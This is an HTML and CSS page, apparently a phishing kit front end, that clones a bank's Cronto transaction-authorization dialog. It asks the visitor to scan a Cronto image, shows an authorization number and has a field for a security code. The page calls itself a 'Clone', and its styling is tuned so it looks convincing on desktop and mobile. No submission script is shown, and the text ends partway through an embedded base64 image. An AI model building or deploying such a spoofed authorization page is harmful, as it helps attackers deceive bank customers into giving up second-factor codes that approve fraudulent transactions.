             <!--!--><!--!--><!--!--><!--!--><!--!--><!--!-->
               
                  
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <title>Authorize — Clone (fixed footer/help/spin)</title>
        <link
            href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
            rel="stylesheet"
        />
        <style>
            :root {
                --dark: #333333;
                --muted: #8b8b8b;
                --accent: #9b266e;
                --accent-text: #fff;
                --border: #d4d4d4;
                --bg: #f3f3f3;
                --button-gray: #e6e6e6;
                --button-gray-text: #333;
                --input-bg: #faf0f6;

                --help-top: 6px;
                --help-right: -46px;
            }

            /* positioning utilities */
            .pos-rel {
                position: relative;
            }
            .pos-abs {
                position: absolute;
                top: var(--top, auto);
                right: var(--right, auto);
                bottom: var(--bottom, auto);
                left: var(--left, auto);
                transform: translate(var(--tx, 0), var(--ty, 0));
                z-index: var(--z, 10);
                pointer-events: auto;
            }

            * {
                box-sizing: border-box;
            }
            body {
                font-family:
                    "Open Sans",
                    system-ui,
                    Segoe UI,
                    Roboto,
                    Arial;
                background: var(--bg);
                margin: 28px;
                color: #222;
            }
            .modal {
                width: 920px;
                max-width: 96%;
                margin: 0 auto;
                background: #fff;
                border-radius: 6px;
                overflow: hidden;
                border: 1px solid rgba(0, 0, 0, 0.08);
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
            }

            .hdr {
                background: var(--dark);
                color: #fff;
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 14px 20px;
            }
            .hdr .icon {
                width: 38px;
                height: 38px;
                border-radius: 50%;
                background: linear-gradient(180deg, #4b4b4b, #2b2b2b);
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: inset 0 -2px 0 rgba(0, 0, 0, 0.2);
            }
            .hdr svg {
                width: 18px;
                height: 18px;
                fill: #fff;
            }
            .hdr h1 {
                font-size: 18px;
                font-weight: 600;
                margin: 0;
            }

            .body {
                padding: 59px 28px;
            }
            .grid {
                display: grid;
                grid-template-columns: 1fr 56px 1fr;
                gap: 20px;
                align-items: start;
            }

            .left p {
                margin: 0 0 12px 0;
                font-size: 13px;
                color: #333;
            }
            .cronto-wrap {
                top: 0px;
                right: -61px; 
                padding: 14px;
                background: #fff;
                border-radius: 8px;
                border: 18px solid #000;
                box-shadow: 0 4px 0 rgba(0, 0, 0, 0.06);
            }
            .cronto {
                width: 220px;
                height: 220px;
                display: block;
                object-fit: cover;
                border-radius: 4px;
                background: #fff;
            }

            .sep {
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100%;
            }
            .sep .line {
                width: 4px;
                background: var(--border);
                height: 100%;
                position: relative;
            }
            .sep .bubble {
                position: absolute;
                left: 50%;
                top: 42%;
                transform: translate(-50%, -50%);
                background: #fff;
                padding: 8px 12px;
                border-radius: 999px;
                border: 1px solid var(--border);
               
                color: var(--muted);
                font-size: 22px;
            }

            .right p {
                font-size: 13px;
                color: #333;
                margin: 0 0 14px 0;
					font-weight: 700; /* bold */
            }
            /* keep desktop spacing as before */
            .right h3 {
                font-size: 16px;
                margin: 105px 0 10px 0;
                color: #444;
                font-weight: 700;
            }
            .auth-row {
                display: flex;
                align-items: center;
                gap: 12px;
                margin-bottom: 12px;
            }
            .auth-label {
                font-size: 13px;
                color: #333;
                white-space: nowrap;
				font-weight: 700; /* bold */
            }
            .auth-number {
                background: #d9d9d9;
                border: 1px solid #e7dfea;
                padding: 8px 12px;
                min-width: 120px;
                text-align: center;
                border-radius: 3px;
                font-weight: 700;
                color: var(--accent);
            }

            .divider {
                height: 1px;
                background: var(--border);
                margin: 10px 0 16px 0;
            }
            .security {
                font-weight: 700;
                font-size: 13px;
                margin-bottom: 8px;
                color: #222;
            }

            /* input area */
            .input-area {
                display: flex;
                gap: 8px;
                align-items: center;
            }
            .input-area.pos-rel {
                min-height: 44px;
            }

            .code-input {
                flex: 0 0 45px;
                background: #9b266e;
                border: 1px solid #bfbfbf;
                padding: 5px 4px;
                border-radius: 3px;
                color: #fffdfd;
                font-size: 14px;
            }
            .code-input::placeholder {
                color: #a88aa1;
            }

            .enter-btn {
                background: var(--accent);
                color: var(--accent-text);
                border: none;
                padding: 10px 12px;
                border-radius: 3px;
                font-weight: 700;
                cursor: pointer;
                font-size: 14px;
            }

            /* help icon (input-level) - positioned relative to the input-area */
            .help-icon {
                width: 36px;
                height: 36px;
                border-radius: 4px;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #fff;
                cursor: pointer;
                background: var(--accent);
                border: 1px solid var(--border);
                font-weight: 700;
                user-select: none;
            }
            .help-icon.pos-abs {
                top: var(--help-top);
                right: var(--help-right);
            }

            .tooltip {
                position: relative;
            }
            .tooltip .tttext {
                position: absolute;
                right: 0;
                top: -8px;
                transform: translateY(-100%);
                background: #222;
                color: #fff;
                padding: 6px 10px;
                border-radius: 4px;
                font-size: 12px;
                white-space: nowrap;
                display: none;
            }
            .tooltip.show .tttext {
                display: block;
            }

            /* footer - stacked layout: input row and button row */
            .footer {
                display: flex;
                flex-direction: column;
                gap: 10px;
                padding: 14px 20px;
                background: #ffffff;
                border-top: 4px solid var(--border);
                position: relative;
            }
            .footer .input-row {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            .footer .button-row {
                display: flex;
                align-items: center;
                justify-content: flex-end;
                gap: 10px;
            }
            .footer .help-inline {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                width: 34px;
                height: 34px;
                border-radius: 6px;
                background: var(--accent);
                color: #fff;
                font-weight: 700;
                border: 1px solid var(--border);
                cursor: pointer;
                margin-right: auto;
            }

            .btn {
                padding: 8px 22px;
                border-radius: 3px;
                font-weight: 700;
                border: 1px solid #cfcfcf;
                background: var(--button-gray);
                color: var(--button-gray-text);
                cursor: pointer;
                font-size: 14px;
            }
            .btn.primary {
                background: #bfbfbf;
            }

            .icons-row {
                display: flex;
                align-items: center;
                gap: 10px;
                margin-top: 14px;
            }
            .mobile-ico {
                width: 34px;
                height: 44px;
                background: linear-gradient(180deg, #a3005a, #6b0050);
                border-radius: 6px;
                box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
                display: inline-block;
            }

            /* spin animation (only applied when class .spin is present or by media query override) */
            @keyframes spin {
                from {
                    transform: rotate(0deg);
                }
                to {
                    transform: rotate(360deg);
                }
            }
            .mobile-ico.spin {
                animation: spin 1s linear infinite;
            }

            /* MOBILE / small screens adjustments */
            @media (max-width: 880px) {
                /* body margin reduced so modal fits better */
                body {
                    margin: 12px;
                }

                /* stack grid into single column */
                .grid {
                    grid-template-columns: 1fr;
                    gap: 18px;
                }

                /* hide the vertical separator on mobile */
                .sep {
                    display: none;
                }

                /* center the left content and make the QR (cronto) centered */
                .left {
                    text-align: center;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                }
                .left p {
                    display: block !important;
                    visibility: visible !important;
                    margin-bottom: 20px !important;
                    text-align: center !important;
                }
                .cronto-wrap {
                    /* cancel the right offset and center */
                    position: relative !important;
                    right: auto;
                    margin: 0 auto;
                    display: inline-block !important;
                    visibility: visible !important;
                    border: 14px solid #000; /* keep the look but slightly smaller so it fits */
                    padding: 10px;
                    margin-bottom: 100px; /* Increased space below cronto image to prevent overlap */
                }
                .cronto {
                    width: 260px;   /* slightly larger on mobile for readability */
                    height: 260px;
                    display: block !important;
                    visibility: visible !important;
                }
                .mobile-icon-single {
                    position: absolute !important;
                    bottom: -70px !important;
                    left: 50% !important;
                    transform: translateX(-50%) !important;
                    width: 35px !important;
                    height: 35px !important;
                    font-size: 9px !important;
                }
                .mobile-icons-double {
                    justify-content: center !important;
                    gap: 8px !important;
                    margin-top: 10px !important;
                    position: relative !important;
                    display: flex !important;
                }
                .mobile-icons-double .mobile-icon {
                    width: 35px !important;
                    height: 35px !important;
                    position: relative !important;
                    left: auto !important;
                    bottom: auto !important;
                }
                .mobile-icons-double .mobile-icon svg {
                    width: 14px !important;
                    height: 14px !important;
                }

                /* make the auth label and number wrap nicely */
                .auth-row {
                    flex-direction: column;
                    align-items: center;
                    gap: 6px;
                    margin-bottom: 30px !important; /* Add space below auth number */
                }
                .auth-label {
                    white-space: normal;
                    text-align: center;
                }
                .auth-number {
                    margin-bottom: 20px !important; /* Extra space below the number */
                }

                /* reduce the big top margin on the heading for mobile */
                .right h3 {
                    margin: 16px 0 10px 0;
                }

                /* footer stack: label, input, buttons vertically for mobile */
                .footer {
                    flex-direction: column;
                    align-items: stretch;
                    gap: 10px;
                }
                .footer .help-inline {
                    margin-right: 0;
                    align-self: flex-start;
                }

                /* move the security label above the input (was inside footer already) */
                label.security {
                    display: block;
                    margin-bottom: 6px;
                    font-weight: 700;
                }

                /* make input expand full width */
                .input-area {
                    width: 100%;
                }
                .code-input {
                    width: 100%;
                    flex: 1 1 auto;
                    min-width: 0;
                }

                /* make buttons full width and stacked (keeps the style) */
                .btn, .btn.primary {
                    width: 100%;
                }

                /* keep the modal width comfortable on small phones */
                .modal {
                    max-width: 100%;
                }
            }
        </style>
    </head>
    <body>
        <div class="modal" role="dialog" aria-label="Authorize">
            <div class="hdr">
                <div class="icon" aria-hidden="true">
                    <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                        <path
                            d="M12 2a4 4 0 00-4 4v3H6a2 2 0 00-2 2v7a2 2 0 002 2h12a2 2 0 002-2v-7a2 2 0 00-2-2h-2V6a4 4 0 00-4-4zm-2 7V6a2 2 0 114 0v3h-4z"
                        />
                    </svg>
                </div>
                <h1>Authorize</h1>
            </div>

            <div class="body">
                <div class="grid">
                    <div class="left">
                        <p>Please scan the Cronto image and verify the validation details.</p>

                        <div class="cronto-wrap pos-rel" style="display: inline-block; position: relative;">
                            <img class="cronto" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/Refresh_icon.png/1200px-Refresh_icon.png" alt="Cronto image" />
                            
                            <div class="mobile-icon-single" style="position: absolute;bottom: -70px;left: 120%;transform: translateX(-50%);width: 40px;height: 40px;/* background: linear-gradient(135deg, #6B46C1, #9333EA); */border-radius: 6px;display: flex;align-items: center;justify-content: center;color: white;font-weight: bold;font-size: 10px;/* box-shadow: 0 2px 4px rgba(107, 70, 193, 0.4); */">
                              <p><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEYAAABnCAYAAAC93jQXAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAGdYAABnWARjRyu0AADCRSURBVHhezb35kyXJcd/5iYg831VXV1VXVU9fc/X0HN3T5xgugksTJcBEcFfSykAzQjQOtNz/Yhd/xOrnFYkZgtSaAGIAUKQkgssFl5CREkBgZoC5ema6+qiuo+t4V54RsT9E5ntZ1dVDkGu2tm4Wle/ly4wM/6aHh4e7R5Sw1liw/N0kALDV8e9L9V31kz6pFnvMRY9rYX3Jo/XZRqlJgJWN79Mbj1yFsFZXwDzu0dSXAqK68tFmfBIdvdo2anyEjrZGPL51TVAeqc8asCVgQAgQ0oFi1fSa6qZJ/VXDBCCMLW3N7qNNaD6yBsaVup7m8ThGm43nMbUf5drW4NSNrm4+Ck6zZRIQzQusBp0BGqQE6TlQrHfo5rpuY91zhQApXH2fQMeBNf2leTz6mccAVdPkN2vdW7VmgsjkqfVnC8Zd9UiZ/G6mzDkyDhSrG1c2qMHa0XYDSIusJOBIaWJy3J2POV2fa0pKE6Dpd4uYNL6sjgZrzbTBdTmuGdVvpi4GjAZjLLZ5hzj27kMkbNWuuhs5CawOk6Os5Kv6fIi1JouPo2lDpl20fr96UsTkc3mouPPuDQtRd1wHosQgJmXaqQVgsVjbBATXJ0RVjmv7EbxqcACENtZOtUZ99TEA15U3hMlY926a9x5Wz83vdYWNxk9Aq0kACosHyOoOC8JgG93BIgGFqF+cFQ4UaxEClKTqnkVVvwShpjqm0eVEXUX1+IkIlMbaWi4O0QSYuoYaSncwFTBNcl2jKSl1dzl87lA5pDFFJaUeoKrvTUkzFeTNa9x1tcTUb33STbHTeq1TwBPBqtlqlrolpbH2mPMNYDim8dMRY0rHM+/OTdRkVY5+r6lmWlVHV++0y5kj4NWS5V6tBay1Tk9hQDSk0UqEdfdM+K0ZFtVzDgFjra35fgQcaDS8PjZqe+Ti5rXHlaOANAtTpg/JsHWgiLJx3RQYB0oNpkAbQ2kKrDUIWTPvupuwHgLPDceVdp1S1bZKhETpNFalmae6gao+qMczd86N9bLqnP9fUiUF0BgYjqcSiza60rsWM8FfIlBIAarWydQKR1fMOd5EYV1XYqLljyrK+ubqkxUIIUBUhtL/D2mca4y1BL5CSqd/DLaSGqeypazVewW41Y5HIUF4DpgpKE5q6u+PAlMBYg2bDza5e/ceaZKhlA9iCmldY3WHK5MuXP/ifrXU+kpMBHRC1g3ZTl80DTVRjV5VlxO45wvIS01RGjrdDqdOrTI/P4fyFAiQOMUoq5HcAVMp9tp+EsoBUzYmkbWkNFisW1jdJIAAbMF//NP/xLf+/bfYeLBJFLeQysciMFY6CxTH8QSY6naBRVrrpM4KtIXS2AqYBpiuAje6iNq+mY4yzjCV2PqFCBBSgZSEUciTTz/F53/5c1x87gLtThulFJ5wT6g1mOOxVuo1r26kq4CpmJ+AMnmX1cVVP2wA89rXX+ff/G//ho8/WqfV6SK9wJlgVrjCYWBovCVX3C/aTIGhAscBUz9fI4RGUCIwlVVLAxicyVfpB+Up2p0OV66+zL/88v/IzZvX6bTbSCknwAicNGLNxKB06qGGTdLQzTUcddNrG6FWdM2RQuApjzCMCOOYIIoIQlf8qCphjB9FeGGMCmO8KMKrfg+iGD+O8OOQoBURdWLidkTciYg6IVE7IurUJSbqtAg7bcJOm6jTIex0iDptok6LuNMm7sQEUYDyBAiLtSVKCXqdNnO9Hi2lUBUoWDDaUJaasiwpS+2mEZZDPFaqvcbxcJkOhVPhq8nzfVqtFu12h1a7Q9zuELXbRK0OUduVsFla7hi1HWNhu0PU6RB327Q6bVrdNq1Oi1a3TdxtEXfbxL0Oca9L1O0QdbtEvR5Rr0dclVavS6vbod3p0O60abVbhGGAlBJfSdpxjF+1V1IJYCX81pgJIM72b/IokFNWH0f13LwJjBuZpFRIJUEqrJRY6WGVhxYepVBo4aGlh5EeRvoY6aOro1U+VnkYoTBCoOtSzaRKBCWSUihK4VEIjwJXSjxKFCUSjcQIiR+EtNptgsBH65KiKLBmauAZXYI1bqiWwukcz0N5PlJWhmKDTzkdLR5DtZo5IjFOk0qEVK4oDyMVWiiM9LAqmAChpY9WAVoGmLood7TSQyOraaVjtBQ1IIoCRYFPQUBOQIFPXgFUoCisQFuJ8gOiVosgCMFadFlijZ4012o38ggBUgo8rwJGeUjlIYQDpp7luK50BJym2nV0FDo37LluqfCDEOmFlEaSawFehB93EGEbLUMKEVCKAK1CtIowKsKoEKtC8CKkHyNUhMHDyAAZtJFhm0IEJFqSEWC8NsZrU8iYnJBUKzKtKKyHlT5GKGdjSYnvefieh5zY/NVEG6dwj3IHNCw4N+xMJObvlJwjZHB+ECE9vCBC+QGlEWQlCD8m7MzhxT20iihFSCkjtIwwKkZ7EVpEaBFiZYTwWiAjjAiwIkSGHWTYoxQRqfYpRIT1exi/Ryna5ETkhBQ2QBOg8SiNoCgN1gqCICAKApSsVCigpKz0TG2zNIzWI4VaYv4+gNQkcN3ICjc8aysxQoEK8aMOYXsWL+piVYxR8eRoVIQmJC0lo9QwSgxJZslLiSHEiJBCe+TGw6oWMppBBDNYr4sWLXIRg9+jM3eS3sIKwm+R5IYsNxgrEEiUUEjpDIJpe2lo3+mc7ThQACSisgweh04tTkduFdIpX6ysrE0LMsAL2wStmQqYHsJvYb0YvBZ4LYyMKWzAKLXs9XN2D1L2+xlJZrGEGCLGGYxSEF6HVmeJoLWA9ToUokVhI7xojuXVJ1l94im8qMtgXDBOS6xVbh7njJvDnNZ20cQ+cp6+o8DUt0jQh6fnvyBJqfA8HyEVpbaUGqzwkH6MF7bxwi7Sb2NljBUxVrVAtRFeB1QLbUPy0qM0PtZGWFpY0QLRmn6WHfA6WNlBiw5WdhH+DCqYQYU9pN8BGaGth7Ee1iqsrf04DU93TdYemeFTAXQYQ5zEOIuSyqp8FL3mtymASjmlqzwfYySlERh8hAwRKkYqB0hpQ0oirHSgeOEMfjSHH84ShHO0Wkt0e6vE8SJS9JCyR9xapNVexogO49QjyX0K00L6s0TtJYTXY3c/Y3N7QF4q4tYcQdhxbgjr3BbC1i7aiiaSwiGeDp1peCelA+TxEnMYnOlZZ8e4KbqxFm2oTHQfZAAyrErUKLFTtjJC+W38sIsf9vCDHkp1QMRAjPI6KK+DFRGl8SlNgBExqA5e0AMZk2SW4bhAG4XnxygvxArXtScG6SFgahaaL3rK3aFLmpavOzGdIR2F4ihprcmLnDzPKYqSUjvlZ4V0UwnhIb0QL4hRfoQVvhu1spI0L9FIhPIpSsNgOGacZGgj0FYwTnJGSQbSI251iOIOnh9iURSlxQpF3O7SnZlFeQFFqSm1c3va2lf52MY3uDtOr1bn3Cys6pPH1VWP7YdPWozRlEXhDKlKTGu/q7ZuYic9nzCKCcII6XkYC2mek6QZFosX+GhrGI1HjLMEbTWlKRlnY8bpGIvBD338wENIgcWgjQYBcSum1W4hlCAvckpdTJi1NIz1CR3h4ThQmEqDxLp+eZT5wyA9qsyUlAS+RxQGtOKQKAqQUmCsptQ5RZkjpCWIfYI4QHkSbUuSdMg46WNsiedLlAeGnLwYMUwOGI4PGKd9xlmfUbLHaLxLku6T5wOMSRGixJic8WifweAheT5ybk+hsZXPxh43mExmz0dONzBqfpZYv4rpPtqFjgWnIiUlYeDTikPa7Zg4ClFKYExJUWaUJkN50O7GdHst2t2IMFIgSiwFUSSZmYnozUa0ewFBLBAqA5nihyVBWFAU+wwGDxgON8mzPaRI6bQkUWAYjR6yt7tBmvYRskAqPQHHigqcJg7OGfTJANXGLiBM6XybphKIJhhTNWYRtnoLQoEpeeON7/L663/A7fvbeO05UkIeJoLS6zJ38jQLK0/QmV0kanVRnsKanGQ0ZG9rB1tkrC33WJxvkw5T9ncHWFPgBxY/lHhRwCjJeffWPdbvPqTQilZ7htNPrPHsM2cQtuDjW+/z4N5thvub6KxP2zPMxApRpChdcPPqZf6nr77Ky1decu0u9USy6nmec694lYPNSYKsYteHgDENYGrkHDg1MNa5NnXBN7/5Lf73f/t11u9vE3QXyGSL/Uxho1mWnniStXPPsHr6SZZXn2B2NiYKS0yes7+TII3m/OmY1eWQ8dCyt1MSBJa5eeh2PdqdkHsbu/y7b/4Ff/JnP+ZgUDA3u8DNmy/xxS98CoHmL77/f/OTH/2Y7Y3bpMMdIqWZiX0HjCm4eeVlfuervz0FRjtPoIs2UDnzFaYCph7NxSSof4yk8Eg34ogZ5CxIYS3WmKo4xTstIJD4yiPwA+IwIgxCPOVNfK/WgETheSGeF6Kk716DtphSg6m8JMZitcaWJWiNMBqJqeY+7vn1tNi5OiWm8gFPadJJGl1sOrQc7VzCGGMNwklMZcIdlpZaYupckxB0xne+/R1ee/0PuH13CxHPkhKxmylKv8vs0mlOrJxmfmmN2flF4laMJy2j/gH3Pl4n6R+wuNDixFwbUwqyxGJMASLD2BxjcwajEev3dniw1SfLDL4Xc+rUSS48exZPGe7euc3Wxh32H26QJfu0AslsO0CUOdJobly9xP/81d/i6ssvOk4NIIpH4lMW33WpicQ4J5UwRlsjXJi8djW7Wxw4zrlpEbYeDkPQKX/83f/AN77x7/j4ziYm6DK2Ifu5T+F1aM+v0ps/SdyZJ4g7+H4IVnCw+5Db7/+cg4fbdFstep0OSkiM1hR5QZKmjNMRo6RPaQriVkQUxRgjMVoSxzG9TgffM2g9osgOGA93KfMh7VDQa4VQ5khTcvPqJX7nq/+Ka4eAqbtSPS2o4+QubGsbwMjmPKkhbJPvU2p8E65PGmMpSk2e55RFiRQCz/PwlIdAkucFw8GIwXBMlhUUhaYoDHmuydKCNMnJ0oKy0IBzF/ieT1lqyHIkkigICf0ATypsacjSlDzNsNrgSUUUhrSiiMAPqhY2On2jyU1z35WjnYdDN8g6pWLababScpicJnfkQiSFNhRlSVGUaO087Z7yUEohpERbS17/bgxSKeJWm063SxAG1eBgUZ4ijkNmZjosLMywdGKO3vws7VaEpxSeVPjKq4rCk7IqitAPiMII3/PcKGxtNe4e1pKPgtLULk1xcCSdjeq8rBKNqvJQmiafM7UrUx9AKHeHde5IpEIo5VyE0omlMcY5pYMAhCRJMwpt6c4usLC4gvQDBuMh+/19+sM9Dga7DAa7QMnq2knOnTuD73vs7T1kNBogJQSBTxj4+L6Pw6BSvNUAgHWBfCnsJL1jQhNP3BSUpsduImXVsQKmRFbuZTUBp76lvqmWJbDCQVdagREK4QUo3wdZxfaMRhuNlJIgihBKkeY5VghOrq5y5vw54k6LUTpinA3RJkXrMUUxIG5JLlw4z4uXLtLrtRn29xmPhggBQeC57ua7jAWjNUaXaF1iTeXsxqCkRVVJR1Nqjj6uj7hy/Pyw6hu2dla64FNjGDuObAWOrQPgwmn1oijIsgxdlhhryMuCJE3IigKUx9yJGZ6/dJor18+xtDKLCjxWVhe58coLfPZzL/PKpy5x8+YL3Lx5gatXnuK5C+dYO3WKbreLtZokGTMejRiPxxRFjjV193Ueu2lHcQlEhxmYsl2D8+gvU6oCbs0aGpUfQnl6swUQAlnpEgSUWpMmCcl4RFnmWGtI0oS9/X1GaYIfRayeWuTajdN86nNneOLsHN2ZLi9eusCXv/xFXv3qv+Arv/nf88/+h1/hlz73PDeuneNTn7rEzVducOqJU2ij2d/fZ+fhDnu7uyRJgjEGTzkp8jwPJvZYbWfVPDHxOdXycViaHiU5jTY2PF9VmUaTD5OAqWGFdeEIJVGeRKlaR7uZcKFLirIkLwsyXZKbksIYSmtRvsfKygKXL53l5rNzXLt8khcunODMfMTa2iwXLz7JlSvPc+7cE7RbLYQQGGPQ2lRZmgKtLWXpgmdH23+UHBh1jziSx3fECyFdAo5fpWHVx9rhcyQoP3mAi9PoIgNTEviKditidqbDzEyXIPSdW8FXxK0IKy27/V3eu3WbP//Be/znP3+f9z7cJitzwhBm2jALLAC96jX5wNkzJ7h65RkuPneOkyeXmZ9bYKY3S6vVxvcDbOW76Q/GJGmBtRIhXBaEPTJZnEqPnSRHujLVnvVgJqjSWR0IR2PV03lCjWjzIQKLrJSdxOApiKKAKA4QwlKUORaD8hVWGEbJkI2th7z5s3v87Vsb7OwmoBRZnrK5ucsmlo0kYX1vwDt3D3j/oz5JAr1ui263TRiEhGFE3GoTt9oEQYyUPlpbsrysQidVEuKEpyPUcIQ7yXk0+7OGUv0vX/va16hPOOVxnBROqfrt1ge3eOeddxgMRxgkhbYUVdg0LSxJoSmFwkqf0jodhJAo4aFLQ5GnSGGQ1rCztcNP33qPv/mvb/NXP/wxf/Znf8l/+5ufsn+QMByV/PznH/PW2x8wHIwJ/ADf9/F9hZKgde6kVgkCXyGsRgrLqdWTXLl8mZWTS1XDq/waUQ8yR7qexeXiiMr6PVYFHXeymqTV5ClFFAZ4UlDmGWmaUGQZRZ6T5ylZmpAkY5JkTF4UCCkJwoC4HTAzG7N2aonVtWUG44K/+pt3+NPv/4j/9Bc/4j/8xx/yzW/9KX/0R3/CD/7yR/z83bus391me2eX4TjBWIHyfPwgxA8jgiDC9wOU8qYMVu67499vzcdUcqaATXmUzUsnNR2tcQLK9FgWOel4TJGmYA1KumC5pxRRFBLHMdZYBsMh/f6AJC3odEIuX17ln/yTC/z6ly7z6792jS9+8Rq//I+u8blfuclnfvlTXHnlOueefY7FtbPML60xM79EqztHEHfwwhjpB6C8KhenCiha4cKz1F5GcdTwPULHgVN/dmUiMY+AU9MhUKrP1lDkGcloQJ4lKAGB7+Epie8p2nGLbqeNkoJkNCLtD0lGGe2Wz6WXVvjVzz/FF375Wb7wjy/xpV9/hX/+L/87/sVvfIF//uVf55/+sy/x2X/0q1y6+WnOXXiepdUnmF1Yot2bJ4jaCOUSlMoqx0WbOpnIuSDFBJQj4HwiUMCh4BEVMEfBeISaaDpSShL4PoHv43suMccaQ1kUlEWBKTVKSEI/AKmgLBgcDLl/b5cPb+/ywfpD3v9gi3c/2OTdW1t8tL7HxvaY3X7BMLOMcsPDgxEb27vs7g9I0pwsL0nzgjwvKbVLQBRSuvmZVJWedG18vJ3SVLFTqu+qSRR2mhn+qPjVJ+o5OZVrU/Mn3/tj/o8//EM+Xr+P8WJSAgalTyIitN/FBF0IZzB+i2GqOeiPaLcjnj6/xvLiDJiSMsvQOscaTbvdZmZmluFwzPvvfcBgMOKJU2eYnz3B7Q/v8P7PPsCUmpmZHq1IEagSZVNsMYRyhEdKIArQCb403Lx2iX/921/h8uUXHAsmn7o2J12nNgyUC/0gEQikqBIAJtIgmpJxpN8dQU1KiZQKUUmK1QYlXUC9zAqS4Zgyy/GEJFIeoVIU45z1Dzd588cf8ebfrvP22/d48617/OStu/z07Xu8/d4GH9/dY39UMi7g4cGIB9u7DEYpKM/pF+Hy7YxxK1UmWeBVG2vj7aiEO2qMQoiJaVLPm5rS5MIDEyCcp92VSlML8wgoICi1JstykiRlPE7QpaYdtZjpdJEIkuGIcX9ANhwjtKEbx3TDCLKMfNBHFBmhlHjSx4qA3HgkhaQQIa3ZRWZPrOLHPbTwCNtd5pdPMr+4RKvTwQ98hARdRSTyPHXDNhohavtk6md6lETDBacwVWrsdCIEsjaTJ+P85HgM4o2uabR1pn5RUhYl1lg8pQg8H2Uttigo05QyTbBFjm8hlBDYEl8XeLrAsxpfSnwvBDySTJOXEIQd2p0eQnoUpcULImbn5+nNzRLFUZW3azCmoCwzyjJDm6J6sU075ThqSspRQKYMyqlp3KzQlUNVN6erlaPZ4lJBPN9HCEGWpqSjEcIYYt8j8hWeNZh0THKwSzHs01IwG/t4Oicf9CHPCZUHxtDfP+Bgd588zTClJh2PGQ76WFPSbsW04hClAFtiTIE2BcaWGNxCsFpaJirhkKRPATlk3TfITnOJcGkgE1CmSNdG8vEGs3uIEE7P+F7ggElSxsMBVpdEviJSAs8U2GxMPtxHjw+IpabrC3ydocd9RJESCYvSJcVwSDI4oBgPKZMx2WhAOupjihRfWgIPlDBV3q/L/51kdqNdYny1tmmycmRCTR6O4+kwVa7Nw11nKjM1MG5tWV2Js6GcV88K55yyxlKWOUWeofMUk6eYbIzOhohiTGAzfJNBcoAZ7+EVQyKb4RdjSPp4+ZiW1LTQiHREOdrHpgNEMcZkQ/LxAbYYE3iGVihpxR5RqPA9EEJjbIk2JdpoTJXBcVjm6/ZPJcZ1o0evYKpjpqDUNNXv06lWrc5sBY4Dxa0us0Y7j1qZY4oUnSeU6RCdDlEmpeUZYpljkj2K/jZePqQjcsJyhBjuEWRDZj3DjKfxsgF2uIvKh4QmxaQHJP1t8vE+HjlxIGhFilbk4fsgMBUwBdqWGPQjsEyyIB7pBYdlqabGFLT5s0N2KjGH1ZkDRoKUiElxubFKQuBL4kASehavSkaNlSZSJb5JUOUAX48IzZiwHBEUA4J8QJgNCPMhYTkkNGNaIieWBaoYUQx3SQ62GR3skAz30EUCFE6vSKdX7ERWHn3VlkaKyFFQGu6GGpwji0Vdqcd0h+r0IU2JQbjUUakkUgmkFCglCHxJuxXQ60a0Y49QGUKliX1DrDSByPBtimdH+GZEaEbEekSYH6DGD1HJLrEe0ZE5Xa+gowp8M6Yc7zHa32R36y57O/dJhnuURYK1JUJahKyWlQiLbQQPa2qC4qYNbsowOVYAUYEkD2vpqT/mOFCawGhjKLVGW7cSXkiLNQVGZ2ALJCXoFF0MscUIz6Z4JIhyiC0O8PSQ0I6JzICoPCAu9mkVB7SKfcJ8jyDbRSW7iGQXlbnrRT6gTPbJxvtk6YAiG1HkCWVZYKyZSHLtqDoconVSc+TEYVAOSYytV5c2yhFQmqU+X5YlaZqS5/kEtiwfMxodMBruMx7uMejv0N/bYjzcocz6mLxPNt4lHz9ElgNiMSbWfcJsm1axyyx9euaAINnG7N8j27lNsn0bO96hJTJaXkkgcqRJKdIh41Gf0ajPaDwkz/MpMFUUowlE3XaoXBP1r9UYPelO1YVymrPW8N5VmxrUFU4rnZ4z1qB1iTF6stjKaGdkddohS0vznFpd4vSpJU6vLbK2Ms/CXJvQ16ATPJHR9ku6YclcWHKyKzizEHF6LmQ+KInNEDvewYx26HqaJ5ZnefKJZc6fXuHM2klWlhdYXpxnZWWZlZVlur2uywc0VCPo4RHnEbKTPxNqypOwul6v5PQG1fvXlWezqXQFEAEZ8O1vvcFrv/c69+/fp91uUxrL/mBMGLd58aXLXLz4PK1WG2MMCgNlxtbdj3jzr/+S7TsfMd+JWZ6dJVYBoQo4MX+C5eWTZFrz4b07rD/Y4M7mFokWPPPCy1y6/mnaswukRpNbQ24KNBoVeGR5wnvvvsO77/yc0WBAK4p45fp1fue3f4tXXnKx69K6NHhJ7cSpmKqn0E0mJaiv/a9f+9pU8VbXNK6zDSRFtXZVA++/9z5vv/U2w8EAz1NYoCg1M/Nz3Lx5k89//pe4/PJlLl58lqefOsfq0gkUJZv3bzPY26bbCjgx22O+22Zpfo7zZ57g2WeeYmFhlkJnJNmYwWgASvL8iy/xmc99nudeeJ4zZ89y+sxp1k6tcvrME7zwwkXOnDnDwf4+tz74gGF/SOiHnD61xtWXL3FqeRmqF1wnVR3mrMF7zeRjN71oSFgTlOZnazW6LMgrt2aSjBgnI/IsRSlJqxXT7bTodCO6vS692R6dXocgCvF8Dz/wCaOQuB3T7XWYnZ9haXmBlZVFVlaWWF4+wexsj163zYmFOdbWVji1tsrKyZOsLJ/k5PIyqyurnDtzivNnz7Ewt4ASCqNtNdJ8ghdvokyq6UNzrK6YPB6YI3QUV4FbCOUs3cq/Ox4zGgzo9/vsH+yzt7/P1vZDNjZ22N7eoT8ckmQ5RanRVmClh/DcmiUtqvwcKRC+T9xp05np0ep0CKIILwhQnsJYS57npGlGkReYQrtwtRXIeoXsB